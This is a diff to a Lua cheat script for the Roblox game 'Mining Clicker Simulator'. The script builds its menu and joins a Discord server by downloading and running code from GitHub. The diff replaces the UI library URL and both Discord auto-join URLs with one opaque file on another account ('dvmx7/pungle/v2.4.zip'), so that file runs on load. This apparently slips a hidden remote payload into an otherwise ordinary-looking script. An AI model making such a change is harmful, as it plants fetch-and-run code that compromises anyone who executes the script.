@@ -1,4 +1,4 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/dvmx7/dvmx7/main/pungle/v2.4.zip"))()
 local Window = Library.CreateLib("MRX Project [Mining Clicker Simulator]", "DarkTheme")
 
 local Tab = Window:NewTab("Main")
@@ -1304,7 +1304,7 @@ Section:NewButton("Our Discord Server", "Feel Free to join it :)", function()
 
     --Example getgenv().InviteCode = "pATHmbedmh"
     
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dvmx7/dvmx7/main/pungle/v2.4.zip"))()
 end)
 --Discord Auto Join
 
@@ -1312,4 +1312,4 @@ getgenv().InviteCode = "PTPJBKnKFh"
 
 --Example getgenv().InviteCode = "pATHmbedmh"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dvmx7/dvmx7/main/pungle/v2.4.zip"))()
